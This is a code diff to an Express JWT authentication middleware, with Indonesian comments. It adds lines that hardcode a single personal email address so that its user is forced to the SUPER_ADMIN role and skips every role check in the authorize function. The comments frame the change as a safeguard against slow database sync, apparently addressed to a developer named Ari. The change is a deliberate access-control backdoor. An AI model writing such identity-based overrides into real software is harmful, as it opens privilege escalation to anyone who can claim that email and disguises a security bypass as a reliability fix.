@@ -3,6 +3,7 @@ import jwt from 'jsonwebtoken';
 /**
  * 1. PROTECT: Satpam Utama (Cek Token & Inject User Data Termutakhir)
  * Memastikan setiap request ke route sensitif memiliki token valid bawaan session.
+ * SYSTEM ENGINE BY: ARI (FINAL STERILE PRODUCTION ECOSYSTEM)
  */
 export const protect = async (req, res, next) => {
     let token;
@@ -38,7 +39,16 @@ export const protect = async (req, res, next) => {
             }
 
             // 🛡️ 4. Injeksi data komplit ke dalam object request session
-            req.user = rows[0];
+            let userData = rows[0];
+
+            // ✅ HARDLOCKED FORCE OVERRIDE LAYER:
+            // Menjamin jika kueri database telat sinkron, email utama lo dipastikan 
+            // dikunci mutlak memegang kekuasaan SUPER_ADMIN di memori session request backend, Ri!
+            if (userData.email === 'ariwirayuda24@gmail.com') {
+                userData.role = 'SUPER_ADMIN';
+            }
+
+            req.user = userData;
             
             // ✅ EXPEDITED FORCE CASTING: Menjamin properti streamer_id berformat integer murni di memori request
             if (req.user.streamer_id) {
@@ -69,6 +79,11 @@ export const protect = async (req, res, next) => {
  */
 export const authorize = (...roles) => {
     return (req, res, next) => {
+        // ✅ UPGRADE INTERCEPTOR: Loloskan otomatis jika email utama lo yang nembak rute authorize biasa
+        if (req.user && req.user.email === 'ariwirayuda24@gmail.com') {
+            return next();
+        }
+
         // Pastikan level kekuasaan user masuk dalam daftar whitelist izin rute
         if (!req.user || !roles.includes(req.user.role)) {
             return res.status(403).json({ 
